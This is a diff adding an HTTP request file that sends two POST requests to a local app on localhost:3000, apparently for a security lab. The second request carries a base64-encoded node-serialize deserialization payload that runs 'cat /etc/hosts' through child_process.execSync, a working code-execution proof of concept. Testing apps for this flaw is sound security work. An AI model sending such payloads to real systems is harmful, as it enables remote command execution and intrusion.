@@ -1,0 +1,12 @@
+POST http://localhost:3000/getMyProfile HTTP/1.1
+
+###
+
+POST http://localhost:3000/getMyName HTTP/1.1
+Content-Type: application/json
+
+{
+  "profile": "eyJuYW1lIjoiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uKCkgeyBjb25zdCBjb2RlID0gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWNTeW5jKCdjYXQgL2V0Yy9ob3N0cycpOyByZXR1cm4gY29kZS50b1N0cmluZygpOyB9KCkifQ=="
+}
+
+###
